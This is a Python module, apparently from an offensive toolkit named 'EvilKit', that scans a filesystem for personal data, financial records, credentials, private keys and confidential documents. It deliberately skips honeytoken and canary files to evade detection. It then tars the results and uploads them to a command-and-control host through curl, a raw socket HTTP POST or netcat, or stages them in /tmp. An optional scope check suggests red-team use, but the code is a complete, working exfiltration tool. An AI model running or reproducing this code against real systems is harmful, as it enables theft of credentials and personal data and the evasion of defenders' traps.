"""Data classifier — scans filesystem for high-value data and optionally stages exfiltration.

Read-only scanning for PII, financial records, credentials, source code, and intellectual property.
Avoids honeytokens and handles permission errors gracefully.

Usage:
    from data_classifier import classify_and_exfil
    report = classify_and_exfil("localhost", scan_root="/home", max_files=500)
    print(f"Classified: {len(report.files_classified)}, Honeytokens avoided: {report.honeytokens_avoided}")
"""

from __future__ import annotations

import http.client
import ipaddress
import os
import re
import shutil
import socket
import subprocess
import tarfile
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any


# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------

@dataclass
class ClassifiedFile:
    """A single classified file with its category and confidence."""
    path: str
    category: str  # pii / financial / credentials / source_code / ip / other
    value_type: str
    size_bytes: int
    confidence: float  # 0.0 - 1.0


@dataclass
class ClassificationReport:
    """Aggregated classification and exfiltration report."""
    host: str
    files_classified: list[ClassifiedFile] = field(default_factory=list)
    honeytokens_avoided: int = 0
    total_value_bytes: int = 0
    exfil_complete: bool = False
    timestamp: str = ""


# ---------------------------------------------------------------------------
# Honeytoken detection
# ---------------------------------------------------------------------------

HONEYTOKEN_FILENAMES = [
    "flag.txt", "honeytoken", "decoy", "honeypot", "trap", "canary",
    "honeytoken.txt", "decoy.txt", "honeypot.txt", "trap.txt", "canary.txt",
]

HONEYTOKEN_DIRS = [".git", "node_modules", "__pycache__", ".cache"]

# Patterns that indicate honeytoken / test data
HONEYTOKEN_PATTERNS = [
    re.compile(r"000-00-0000"),
    re.compile(r"123-45-6789"),
    re.compile(r"4111[\s-]?1111[\s-]?1111[\s-]?1111"),
    re.compile(r"5500[\s-]?0000[\s-]?0000[\s-]?0004"),
    re.compile(r"4222[\s-]?2222[\s-]?2222[\s-]?2222"),
    re.compile(r"(?i)honey\s*token"),
    re.compile(r"(?i)decoy\s*file"),
    re.compile(r"(?i)fake\s*(credential|data|secret)"),
    re.compile(r"(?i)sample\s*(only|data|test)"),
    re.compile(r"test@example\.com"),
    re.compile(r"foo@bar\.com"),
]

SOURCE_EXTENSIONS = {".py", ".js", ".go", ".rs", ".c", ".java", ".cpp", ".h", ".hpp", ".rb", ".ts", ".tsx", ".jsx"}

# ---------------------------------------------------------------------------
# PII / Financial / Credential patterns
# ---------------------------------------------------------------------------

PII_PATTERNS = [
    (re.compile(r"\d{3}-\d{2}-\d{4}"), "ssn", "pii"),
    (re.compile(r"\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}"), "credit_card", "financial"),
    (re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"), "email", "pii"),
    (re.compile(r"\+?1?[\s.-]?\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4}"), "phone_number", "pii"),
]

FINANCIAL_PATTERNS = [
    (re.compile(r"(?i)(routing|aba)\s*number\s*[:=]?\s*\d{9}"), "routing_number", "financial"),
    (re.compile(r"(?i)(account|bank)\s*number\s*[:=]?\s*\d{8,17}"), "bank_account", "financial"),
    (re.compile(r"(?i)(payroll|salary|wage|invoice|billing)"), "financial_doc", "financial"),
    (re.compile(r"IBAN\s*[:=]?\s*[A-Z]{2}\d{2}[A-Z0-9]{4}\d{7}([A-Z0-9]?){0,16}"), "iban", "financial"),
    (re.compile(r"SWIFT\s*[:=]?\s*[A-Z]{6}[A-Z0-9]{2}([A-Z0-9]{3})?"), "swift_code", "financial"),
]

CREDENTIAL_PATTERNS = [
    (re.compile(r"(?i)(password|passwd|pass)\s*[=:]\s*\S+"), "password", "credentials"),
    (re.compile(r"(?i)(api[_-]?key|apikey)\s*[=:]\s*\S+"), "api_key", "credentials"),
    (re.compile(r"(?i)(secret|token|auth_token|access_token)\s*[=:]\s*[A-Za-z0-9+/=_-]{16,}"), "token", "credentials"),
    (re.compile(r"-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----"), "private_key", "credentials"),
    (re.compile(r"(?i)(aws_secret_access_key|aws_access_key_id)\s*[=:]\s*\S+"), "aws_credential", "credentials"),
    (re.compile(r"(?i)(bearer|basic)\s+[A-Za-z0-9+/=_-]{20,}"), "auth_header", "credentials"),
]

IP_PATTERNS = [
    (re.compile(r"(?i)(patent|proprietary|confidential|trade\s*secret)"), "intellectual_property", "ip"),
    (re.compile(r"(?i)(classified|restricted|internal\s*use\s*only)"), "restricted_data", "ip"),
    (re.compile(r"(?i)(algorithm|formula|recipe|methodology)\s*[:=]"), "trade_secret", "ip"),
]


def _is_honeytoken_file(filepath: str) -> bool:
    """Check if a file path matches known honeytoken indicators."""
    basename = os.path.basename(filepath).lower()

    # Check filename
    if basename in HONEYTOKEN_FILENAMES:
        return True

    # Check parent directory names
    parts = Path(filepath).parts
    for part in parts:
        if part.lower() in HONEYTOKEN_DIRS:
            return True

    return False


def _contains_honeytoken_content(content: str) -> bool:
    """Check if file content matches honeytoken patterns."""
    for pattern in HONEYTOKEN_PATTERNS:
        if pattern.search(content):
            return True
    return False


# ---------------------------------------------------------------------------
# Safe file helpers
# ---------------------------------------------------------------------------

def _safe_read(path: str) -> str | None:
    """Read a file, returning None on any error."""
    try:
        p = Path(path)
        if not p.is_file():
            return None
        return p.read_text(errors="replace")
    except (OSError, PermissionError, ValueError):
        return None


def _safe_list_dir(path: str) -> list[str] | None:
    """List directory entries, returning None on error."""
    try:
        return os.listdir(path)
    except (OSError, PermissionError):
        return None


# ---------------------------------------------------------------------------
# Classification logic
# ---------------------------------------------------------------------------

def _classify_content(content: str, filepath: str) -> tuple[str, str, float]:
    """Classify file content and return (category, value_type, confidence)."""
    ext = Path(filepath).suffix.lower()

    # Source code by extension
    if ext in SOURCE_EXTENSIONS:
        # Check if it also has credentials embedded
        for pattern, vtype, cat in CREDENTIAL_PATTERNS:
            if pattern.search(content):
                return (cat, vtype, 0.9)
        return ("source_code", ext.lstrip(".") or "source", 0.8)

    # Check credential patterns first (highest value)
    for pattern, vtype, cat in CREDENTIAL_PATTERNS:
        if pattern.search(content):
            return (cat, vtype, 0.95)

    # Check financial patterns
    for pattern, vtype, cat in FINANCIAL_PATTERNS:
        if pattern.search(content):
            return (cat, vtype, 0.85)

    # Check PII patterns
    for pattern, vtype, cat in PII_PATTERNS:
        if pattern.search(content):
            # SSNs and credit cards are higher confidence
            if vtype in ("ssn", "credit_card"):
                return (cat, vtype, 0.95)
            return (cat, vtype, 0.7)

    # Check IP patterns
    for pattern, vtype, cat in IP_PATTERNS:
        if pattern.search(content):
            return (cat, vtype, 0.75)

    return ("other", "unknown", 0.3)


def _walk_and_classify(
    scan_root: str,
    max_files: int,
) -> tuple[list[ClassifiedFile], int]:
    """Walk scan_root, classify files, avoid honeytokens.

    Returns (classified_files, honeytokens_avoided).
    """
    classified: list[ClassifiedFile] = []
    honeytokens_avoided = 0
    files_scanned = 0

    root = Path(scan_root).resolve()
    if not root.is_dir():
        return classified, honeytokens_avoided

    # BFS walk to respect max_files
    queue: list[Path] = [root]

    while queue and files_scanned < max_files:
        current = queue.pop(0)

        # Skip honeytoken directories
        if current.name.lower() in HONEYTOKEN_DIRS:
            continue

        entries = _safe_list_dir(str(current))
        if entries is None:
            continue

        for entry in entries:
            if files_scanned >= max_files:
                break

            full_path = current / entry

            # Skip honeytoken files by name
            if _is_honeytoken_file(str(full_path)):
                honeytokens_avoided += 1
                continue

            if full_path.is_dir():
                queue.append(full_path)
            elif full_path.is_file():
                files_scanned += 1

                try:
                    size = full_path.stat().st_size
                except OSError:
                    size = 0

                # Skip empty files
                if size == 0:
                    continue

                # Skip binary files (simple heuristic: check for null bytes)
                try:
                    with open(full_path, "rb") as f:
                        chunk = f.read(8192)
                        if b"\x00" in chunk:
                            continue
                except (OSError, PermissionError):
                    continue

                content = _safe_read(str(full_path))
                if content is None:
                    continue

                # Check honeytoken content
                if _contains_honeytoken_content(content):
                    honeytokens_avoided += 1
                    continue

                category, value_type, confidence = _classify_content(content, str(full_path))

                # Only keep files with meaningful classification
                if category != "other" or size > 1024:
                    classified.append(ClassifiedFile(
                        path=str(full_path),
                        category=category,
                        value_type=value_type,
                        size_bytes=size,
                        confidence=confidence,
                    ))

    return classified, honeytokens_avoided


# ---------------------------------------------------------------------------
# Exfiltration
# ---------------------------------------------------------------------------

def _execute_exfil(
    files: list[ClassifiedFile],
    c2_host: str,
    c2_port: int,
    tarball_path: str,
    scope: str = "",
) -> bool:
    """Compress classified files into a tarball and actually exfiltrate to C2.

    Tries curl first, falls back to raw socket HTTP POST, then netcat.
    Returns True only if the transfer was verified successful.

    Scope validation: c2_host must be within the allowed scope CIDR.
    """
    # Validate c2_host is in scope before any exfiltration
    if scope:
        try:
            host_addr = ipaddress.ip_address(c2_host)
            allowed = [ipaddress.ip_network(s.strip()) for s in scope.split(",") if s.strip()]
            if not any(host_addr in net for net in allowed):
                print("[exfil] c2_host " + c2_host + " is outside scope " + scope + " — refusing")
                return False
        except ValueError:
            print("[exfil] Invalid c2_host address: " + c2_host)
            return False

    if not files:
        print("[exfil] No files to exfiltrate")
        return False

    # --- Step 1: create tarball ---
    try:
        with tarfile.open(tarball_path, "w:gz") as tar:
            for cf in files:
                try:
                    tar.add(cf.path, arcname=os.path.basename(cf.path))
                except (OSError, PermissionError):
                    continue

        tarball_size = Path(tarball_path).stat().st_size
        if tarball_size == 0:
            print("[exfil] Tarball is empty, nothing to send")
            return False

        print("[exfil] Tarball: " + tarball_path + " (" + str(tarball_size) + " bytes)")
        print("[exfil] Files: " + str(len(files)))
    except (OSError, PermissionError, tarfile.TarError) as e:
        print("[exfil] Failed to create tarball: " + str(e))
        return False

    # --- Step 2: attempt real transfer ---

    # Method 1: curl POST with multipart form
    result = _exfil_via_curl(tarball_path, c2_host, c2_port)
    if result:
        print("[exfil] Transfer via curl succeeded")
        return True

    # Method 2: raw socket HTTP POST with multipart form data
    result = _exfil_via_socket(tarball_path, c2_host, c2_port)
    if result:
        print("[exfil] Transfer via raw socket succeeded")
        return True

    # Method 3: netcat
    result = _exfil_via_nc(tarball_path, c2_host, c2_port)
    if result:
        print("[exfil] Transfer via netcat succeeded")
        return True

    print("[exfil] All exfiltration methods failed for " + c2_host + ":" + str(c2_port))
    return False


def _exfil_via_curl(tarball_path: str, c2_host: str, c2_port: int) -> bool:
    """Try curl -X POST -F file=@<tarball> http://<host>:<port>/upload."""
    try:
        cmd = [
            "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
            "-X", "POST",
            "-F", "file=@" + tarball_path,
            "http://" + c2_host + ":" + str(c2_port) + "/upload",
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        status = result.stdout.strip()
        print("[exfil] curl returned HTTP " + status)
        return status.startswith("2")
    except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
        print("[exfil] curl method failed: " + str(e))
        return False


def _exfil_via_socket(tarball_path: str, c2_host: str, c2_port: int) -> bool:
    """Raw socket HTTP POST with multipart form data."""
    try:
        boundary = "----EvilKitBoundary" + str(int(time.time()))
        filename = os.path.basename(tarball_path)

        # Read tarball as binary
        with open(tarball_path, "rb") as f:
            file_data = f.read()

        # Build multipart body
        body_parts = []
        body_parts.append("--" + boundary + "\r\n")
        body_parts.append(
            'Content-Disposition: form-data; name="file"; filename="' + filename + '"\r\n'
        )
        body_parts.append("Content-Type: application/gzip\r\n\r\n")
        body_parts = "".join(body_parts).encode("utf-8")

        footer = ("\r\n--" + boundary + "--\r\n").encode("utf-8")
        full_body = body_parts + file_data + footer

        # Build HTTP request
        request_lines = []
        request_lines.append("POST /upload HTTP/1.1\r\n")
        request_lines.append("Host: " + c2_host + "\r\n")
        request_lines.append("Content-Type: multipart/form-data; boundary=" + boundary + "\r\n")
        request_lines.append("Content-Length: " + str(len(full_body)) + "\r\n")
        request_lines.append("Connection: close\r\n")
        request_lines.append("\r\n")
        request_header = "".join(request_lines).encode("utf-8")

        # Send over TCP
        with socket.create_connection((c2_host, c2_port), timeout=15) as sock:
            sock.sendall(request_header)
            sock.sendall(full_body)

            # Read response
            response = b""
            while True:
                chunk = sock.recv(8192)
                if not chunk:
                    break
                response += chunk
                if b"\r\n\r\n" in response:
                    # Check if we got the full headers
                    header_end = response.index(b"\r\n\r\n") + 4
                    headers = response[:header_end].decode("utf-8", errors="replace")
                    # Look for Content-Length in response to know body size
                    cl_match = re.search(r"Content-Length:\s*(\d+)", headers, re.IGNORECASE)
                    if cl_match:
                        expected_body = int(cl_match.group(1))
                        body_received = len(response) - header_end
                        while body_received < expected_body:
                            more = sock.recv(8192)
                            if not more:
                                break
                            response += more
                            body_received = len(response) - header_end
                    break

            response_text = response.decode("utf-8", errors="replace")
            status_line = response_text.split("\r\n")[0]
            print("[exfil] Socket response: " + status_line)
            return " 200 " in status_line or " 201 " in status_line

    except (OSError, socket.timeout, socket.error, ValueError) as e:
        print("[exfil] Socket method failed: " + str(e))
        return False


def _exfil_via_nc(tarball_path: str, c2_host: str, c2_port: int) -> bool:
    """Fallback: pipe tarball through netcat with a minimal HTTP POST."""
    try:
        # Check if nc/necat is available
        nc_cmd = None
        for candidate in ["nc", "ncat", "netcat"]:
            try:
                subprocess.run(
                    [candidate, "--help"],
                    capture_output=True, timeout=2,
                )
                nc_cmd = candidate
                break
            except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
                continue

        if nc_cmd is None:
            print("[exfil] No netcat binary found")
            return False

        boundary = "----EvilKitNC" + str(int(time.time()))
        filename = os.path.basename(tarball_path)

        with open(tarball_path, "rb") as f:
            file_data = f.read()

        body_parts = []
        body_parts.append("--" + boundary + "\r\n")
        body_parts.append(
            'Content-Disposition: form-data; name="file"; filename="' + filename + '"\r\n'
        )
        body_parts.append("Content-Type: application/gzip\r\n\r\n")
        body_parts = "".join(body_parts).encode("utf-8")

        footer = ("\r\n--" + boundary + "--\r\n").encode("utf-8")
        full_body = body_parts + file_data + footer

        request_lines = []
        request_lines.append("POST /upload HTTP/1.1\r\n")
        request_lines.append("Host: " + c2_host + "\r\n")
        request_lines.append("Content-Type: multipart/form-data; boundary=" + boundary + "\r\n")
        request_lines.append("Content-Length: " + str(len(full_body)) + "\r\n")
        request_lines.append("Connection: close\r\n")
        request_lines.append("\r\n")
        request_header = "".join(request_lines).encode("utf-8")

        payload = request_header + full_body

        result = subprocess.run(
            [nc_cmd, "-w", "10", c2_host, str(c2_port)],
            input=payload,
            capture_output=True,
            timeout=15,
        )

        response = result.stdout.decode("utf-8", errors="replace")
        status_line = response.split("\r\n")[0].split("\n")[0]
        print("[exfil] netcat response: " + status_line)
        return " 200 " in status_line or " 201 " in status_line

    except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
        print("[exfil] netcat method failed: " + str(e))
        return False


def _stage_exfil_local(
    files: list[ClassifiedFile],
    tarball_path: str,
) -> bool:
    """When no C2 is configured, write tarball to /tmp/evilkit_exfil/ and log the path."""
    if not files:
        print("[exfil] No files to stage locally")
        return False

    try:
        with tarfile.open(tarball_path, "w:gz") as tar:
            for cf in files:
                try:
                    tar.add(cf.path, arcname=os.path.basename(cf.path))
                except (OSError, PermissionError):
                    continue

        tarball_size = Path(tarball_path).stat().st_size

        # Ensure output directory exists
        out_dir = "/tmp/evilkit_exfil"
        os.makedirs(out_dir, exist_ok=True)

        dest = os.path.join(out_dir, os.path.basename(tarball_path))
        shutil.copy2(tarball_path, dest)

        print("[exfil] No C2 configured — staged tarball at " + dest + " (" + str(tarball_size) + " bytes)")
        print("[exfil] Files: " + str(len(files)))
        return True

    except (OSError, PermissionError, tarfile.TarError) as e:
        print("[exfil] Failed to stage tarball locally: " + str(e))
        return False


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------

def classify_and_exfil(
    host: str = "localhost",
    scan_root: str = "/home",
    c2_host: str = "",
    c2_port: int = 0,
    max_files: int = 500,
    exfil: bool = False,
    scope: str = "",
) -> ClassificationReport:
    """Scan files under scan_root for high-value data and optionally exfiltrate.

    Args:
        host: Host identifier (default: localhost).
        scan_root: Root directory to scan (default: /home).
        c2_host: C2 server address for exfiltration.
        c2_port: C2 server port.
        max_files: Maximum files to scan (default: 500).
        exfil: Whether to exfiltrate (default: False).

    Returns:
        ClassificationReport with classified files, honeytoken count, and exfil status.
    """
    timestamp = time.strftime("%Y-%m-%dT%H:%M:%S%z")

    files_classified, honeytokens_avoided = _walk_and_classify(scan_root, max_files)

    # Calculate total value bytes
    total_value_bytes = sum(f.size_bytes for f in files_classified)

    # Exfiltration
    exfil_complete = False
    if exfil and files_classified:
        tarball_path = "/tmp/exfil_" + host + "_" + str(int(time.time())) + ".tar.gz"

        if c2_host and c2_port > 0:
            # Real exfiltration to C2 with fallback methods
            exfil_complete = _execute_exfil(files_classified, c2_host, c2_port, tarball_path, scope)
        else:
            # No C2 configured — stage locally
            exfil_complete = _stage_exfil_local(files_classified, tarball_path)

    return ClassificationReport(
        host=host,
        files_classified=files_classified,
        honeytokens_avoided=honeytokens_avoided,
        total_value_bytes=total_value_bytes,
        exfil_complete=exfil_complete,
        timestamp=timestamp,
    )


if __name__ == "__main__":
    import json
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    scan_root = sys.argv[2] if len(sys.argv) > 2 else "/home"
    max_files = int(sys.argv[3]) if len(sys.argv) > 3 else 500

    report = classify_and_exfil(target, scan_root=scan_root, max_files=max_files)

    by_category: dict[str, int] = {}
    for f in report.files_classified:
        by_category[f.category] = by_category.get(f.category, 0) + 1

    print(json.dumps({
        "host": report.host,
        "timestamp": report.timestamp,
        "files_classified": len(report.files_classified),
        "honeytokens_avoided": report.honeytokens_avoided,
        "total_value_bytes": report.total_value_bytes,
        "by_category": by_category,
        "exfil_complete": report.exfil_complete,
    }, indent=2))
